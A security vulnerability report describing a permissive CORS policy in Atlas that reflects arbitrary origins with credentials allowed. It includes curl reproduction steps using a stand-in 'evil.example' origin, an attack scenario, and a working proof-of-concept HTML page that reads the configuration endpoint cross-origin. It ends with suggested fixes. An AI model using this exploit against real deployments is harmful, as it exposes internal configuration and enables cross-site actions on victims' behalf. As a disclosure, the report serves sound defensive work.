# Atlas CORS Security Vulnerability Report

## Summary

Atlas enables a permissive Cross-Origin Resource Sharing (CORS) policy that reflects arbitrary `Origin` headers while also allowing credentialed requests. Because `atlas.pekko.cors-host-patterns` defaults to `["*"]`, the server treats any requesting website as trusted and returns:

```
Access-Control-Allow-Origin: <attacker origin>
Access-Control-Allow-Credentials: true
```

This breaks the browser same-origin security boundary. Any malicious website visited by a user can read responses in the victim's browser context (including authenticated deployments) and send state-changing requests.

Sensitive endpoints such as `/api/v2/config` become readable cross-origin, exposing internal configuration data. Preflight requests also succeed, allowing cross-origin POST requests (e.g., `/api/v1/publish`).

**Impact:** Configuration disclosure, internal network data exfiltration, and potential cross-site request forgery (CSRF) — all via a normal browser visit to a malicious site.

## Important Context

Even when an endpoint is publicly readable, reflecting arbitrary origins with `Access-Control-Allow-Credentials: true` violates the browser security model because it allows any external website to programmatically read internal-network Atlas instances reachable only from the victim's browser (e.g., localhost, VPN, or intranet deployments).

## Realistic Attack Scenario

A user inside a corporate network accesses an internal Atlas deployment at:

```
http://atlas.internal:7101
```

The user later visits a malicious website controlled by an attacker.

The attacker page executes:

```javascript
fetch("http://atlas.internal:7101/api/v2/config?format=json", {
  credentials: "include"
})
```

Because Atlas reflects arbitrary origins and allows credentials, the browser allows the attacker site to read the response.

This enables:

- Extraction of internal service topology
- Enumeration of infrastructure configuration
- Discovery of environment names, clusters, and metrics
- Automated interaction with Atlas APIs from the victim's browser

**No network access to the internal system is required by the attacker — only that the victim can reach Atlas.**

## Default Configuration Exposure

This issue occurs in the default configuration:

```
atlas.pekko.cors-host-patterns = ["*"]
Access-Control-Allow-Credentials: true
ConfigApi enabled in memory.conf
```

Therefore a fresh Atlas deployment is immediately vulnerable if reachable from a browser.

## Steps To Reproduce

### 1) Start Atlas locally

```bash
./project/sbt "atlas-standalone/run conf/memory.conf"
```

Verify service is running:

```bash
curl -si http://localhost:7101/ok
```

### 2) Confirm CORS trusts arbitrary origins

Send a request from a fake attacker origin:

```bash
curl -si -H 'Origin: https://evil.example' \
  'http://localhost:7101/api/v1/tags' | sed -n '1,40p'
```

Observe:

```
Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Credentials: true
```

This proves the server reflects attacker-controlled origins.

### 3) Confirm sensitive endpoint can be read cross-origin

```bash
curl -si -H 'Origin: https://evil.example' \
  'http://localhost:7101/api/v2/config?format=json' | sed -n '1,60p'
```

Response:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Credentials: true
Content-Length: 59332
```

The full runtime configuration is returned with permissive CORS headers.

### 4) Confirm cross-origin POST requests are allowed

```bash
curl -si -X OPTIONS \
  -H 'Origin: https://evil.example' \
  -H 'Access-Control-Request-Method: POST' \
  -H 'Access-Control-Request-Headers: content-type' \
  'http://localhost:7101/api/v1/publish'
```

Response:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: content-type
```

This means a malicious site can send authenticated POST requests from a victim's browser.

### 5) Real-world browser exploit (Proof-of-Concept)

Create `poc.html`:

```html
<!doctype html>
<meta charset="utf-8" />
<pre id="out">loading...</pre>
<script>
(async () => {
  const r = await fetch("http://localhost:7101/api/v2/config?format=json", { credentials: "include" });
  const t = await r.text();
  document.getElementById("out").textContent =
    "status=" + r.status + "\n\n" + t.slice(0, 5000);
})();
</script>
```

Serve from a different origin:

```bash
python3 -m http.server 8000
```

Open:

```
http://127.0.0.1:8000/poc.html
```

The page displays the Atlas configuration, proving a malicious website can read API responses via a victim's browser session.

## Supporting Material/References

### Reflected Origin + credentials header

```
Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Credentials: true
```

### Sensitive endpoint readable

```
GET /api/v2/config → HTTP 200 + JSON config dump
```

### Preflight accepted

```
OPTIONS /api/v1/publish → HTTP 200
```

### Browser exploit result

```
status=200
<Atlas configuration JSON displayed in attacker page>
```

## Security Classification

- **CWE-942:** Overly Permissive Cross-domain Policy
- **CWE-346:** Origin Validation Error
- **Impact:** Confidentiality + Integrity compromise via browser-based attack

## Suggested Fix

1. **Do not use `*` for credentialed CORS** - Wildcard origins are incompatible with credential-bearing requests
2. **Replace origin reflection with an allowlist of trusted UI origins** - Explicitly define which origins are permitted
3. **Disable CORS for sensitive endpoints** such as `/api/v2/config` - Prevent cross-origin access to internal configuration
4. **Optionally reject credentialed requests for non-trusted origins** - Add additional validation layer

## Severity Assessment

This vulnerability allows complete bypass of browser same-origin policy protections, enabling:

- Cross-origin data exfiltration from internal Atlas deployments
- Browser-based interaction with Atlas APIs (CSRF-style actions)
- Exposure of internal runtime configuration

**Recommended Action:** Immediate remediation required for production deployments.
